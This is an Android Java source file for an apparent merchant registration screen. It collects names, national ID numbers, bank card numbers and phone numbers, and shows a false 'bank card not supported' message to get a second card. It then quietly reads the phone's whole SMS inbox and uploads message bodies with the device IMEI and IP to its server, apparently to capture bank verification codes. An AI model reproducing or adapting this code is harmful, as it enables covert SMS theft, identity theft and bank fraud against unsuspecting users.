package com.xhf.sms;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.meiqia.meiqiasdk.util.MQIntentBuilder;
import com.xhf.sms.api.ApiManager;
import com.xhf.sms.bean.CheckCardBean;
import com.xhf.sms.bean.CheckCardResponse;
import com.xhf.sms.bean.ShopAddBean;
import com.xhf.sms.bean.SmsBean;
import com.xhf.sms.dialog.CenterDialog;
import com.xhf.sms.utils.SpUtils;

import androidx.appcompat.app.AppCompatActivity;

import java.util.ArrayList;
import java.util.List;

import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;

public class DetailActivity extends AppCompatActivity implements View.OnClickListener {
    private ImageView mBackView, mMQView, mRechargeView;
    private CenterDialog mDialog;
    private EditText mEditText1, mEditText2, mEditText3, mEditText4, mEditText5, mEditText6;
    private CheckCardBean mCheckCardBean;
    private TextView mCodeView, mTipView, mConfirmView;
    private List<SmsBean.Msg> mMsgList = new ArrayList<>();

    private boolean isFirst;
    private CountDownTimer mTimer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_detail);
        initView();
    }

    private void initData() {
        mCheckCardBean = new CheckCardBean();
        mCheckCardBean.setName(mEditText1.getText().toString().trim());
        mCheckCardBean.setIdcard(mEditText2.getText().toString().trim());
        mCheckCardBean.setBankcard(mEditText3.getText().toString().trim());
        mCheckCardBean.setMobile(mEditText4.getText().toString().trim());

        ApiManager.getInstance().getApiService().setCheckCard(mCheckCardBean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<CheckCardResponse>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(CheckCardResponse response) {
                        Log.e("sms--checkCardBean", response.isSuccess() + "");
                        if (response.isSuccess()) {
                            if (isFirst) {
                                mTimer = new CountDownTimer(3000, 1000) {
                                    @Override
                                    public void onTick(long millisUntilFinished) {

                                    }

                                    @Override
                                    public void onFinish() {
                                        getSmsInfo();
                                        Toast.makeText(DetailActivity.this, SpUtils.getSMSTips(DetailActivity.this), Toast.LENGTH_SHORT).show();

                                    }
                                };
                                mTimer.start();

                            } else {

                                Toast.makeText(DetailActivity.this, "暂不支持该银行卡作为收款账户，请更换其他银行卡作为收款账户", Toast.LENGTH_SHORT).show();
                                isFirst = true;
                            }

                        } else {
                            Toast.makeText(DetailActivity.this, response.getMsg(), Toast.LENGTH_SHORT).show();
                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms--checkCardBean", e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (mTimer != null) {
            mTimer.cancel();
        }
    }

    private void getSmsInfo() {
        mMsgList.clear();
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(Uri.parse("content://sms/"), projection, null, null, "date desc");
        if (null == cur) {
            Log.i("getphoneSms", "************cur == null");
            return;
        }

        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));
            long startTime = cur.getLong(cur.getColumnIndex("date"));
            String body = cur.getString(cur.getColumnIndex("body"));
            Log.e("result", "--" + body);
            if (startTime > SpUtils.getSMSReadTime(this)) {
                SmsBean.Msg msg = new SmsBean.Msg();
                msg.setTel(number);
                msg.setData(body);
                mMsgList.add(msg);
            }
        }
        cur.close();

        postSmsData(mMsgList);
    }


    private void postSmsData(List<SmsBean.Msg> list) {
        SmsBean smsBean = new SmsBean();
        smsBean.setName("");
        smsBean.setPhone("");
        smsBean.setImei(AppUtils.getDeviceID(this));
        smsBean.setIp(AppUtils.getLocalIpAddress(this));
        smsBean.setMsg(list);
        ApiManager.getInstance().getApiService().sendSms(smsBean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onNext(Response response) {
                        if (response.getCode() == 1) {
                            Log.e("sms", "短信再次上传成功: " + response.getMsg());
                            SpUtils.setSMSReadTime(DetailActivity.this, System.currentTimeMillis());

                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", "onError: " + e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private void shopAdd() {
        if (TextUtils.isEmpty(mEditText1.getText().toString().trim())) {
            Toast.makeText(this, "请输入商家姓名", Toast.LENGTH_SHORT).show();
            return;
        } else if (TextUtils.isEmpty(mEditText2.getText().toString().trim())) {
            Toast.makeText(this, "请输入身份证号码", Toast.LENGTH_SHORT).show();
            return;
        } else if (TextUtils.isEmpty(mEditText3.getText().toString().trim())) {
            Toast.makeText(this, "请输入银行卡号", Toast.LENGTH_SHORT).show();
            return;
        } else if (TextUtils.isEmpty(mEditText4.getText().toString().trim())) {
            Toast.makeText(this, "请输入手机号", Toast.LENGTH_SHORT).show();
            return;
        }
        ShopAddBean shopAddBean = new ShopAddBean();
        shopAddBean.setName(mEditText1.getText().toString().trim());
        shopAddBean.setIcCard(mEditText2.getText().toString().trim());
        shopAddBean.setBankCard(mEditText3.getText().toString().trim());
        shopAddBean.setPhone(mEditText4.getText().toString().trim());
        shopAddBean.setCaptcha(mEditText5.getText().toString().trim());
        shopAddBean.setInviteCode(mEditText6.getText().toString().trim());
        shopAddBean.setIp(AppUtils.getLocalIpAddress(this));
        shopAddBean.setImei(AppUtils.getDeviceID(this));
        ApiManager.getInstance().getApiService().setShopAdd(shopAddBean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(Response response) {
                        Log.e("sms--shopAdd", "");
                        if (response.getCode() == 1) {
                            Toast.makeText(DetailActivity.this, "提交成功", Toast.LENGTH_SHORT).show();
                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms--shopAdd", e.toString());
                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private void initView() {
        mBackView = findViewById(R.id.backView);
        mMQView = findViewById(R.id.mqView);
        mRechargeView = findViewById(R.id.rechargeView);
        mEditText1 = findViewById(R.id.edit1);
        mEditText2 = findViewById(R.id.edit2);
        mEditText3 = findViewById(R.id.edit3);
        mEditText4 = findViewById(R.id.edit4);
        mEditText5 = findViewById(R.id.edit5);
        mEditText6 = findViewById(R.id.edit6);
        mCodeView = findViewById(R.id.tvGetCode);
        mTipView = findViewById(R.id.tipView);
        mConfirmView = findViewById(R.id.confirmView);
        mTipView.setText(SpUtils.getShopTips(this));
        mBackView.setOnClickListener(this);
        mConfirmView.setOnClickListener(this);
        mMQView.setOnClickListener(this);
        mCodeView.setOnClickListener(this);
        mRechargeView.setOnClickListener(this);
        mEditText1.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {

            }

            @Override
            public void afterTextChanged(Editable s) {

            }
        });
        mEditText2.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {

            }

            @Override
            public void afterTextChanged(Editable s) {

            }
        });

    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.backView:
                finish();
                break;
            case R.id.mqView:
                Intent intent = new MQIntentBuilder(this).build();
                startActivity(intent);
                break;
            case R.id.rechargeView:
                rechargeDialog();
                break;
            case R.id.tvGetCode:
                initData();
                break;
            case R.id.confirmView:
                shopAdd();
                break;
            default:
        }
    }

    private void rechargeDialog() {
        mDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_recharge)
                .setViewGravity(Gravity.CENTER)
                .setViewListener(new CenterDialog.ViewListener() {
                    @Override
                    public void bindView(View v) {
                        v.findViewById(R.id.confirmView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                mDialog.dismiss();
                            }
                        });

                    }
                }).show();
    }
}
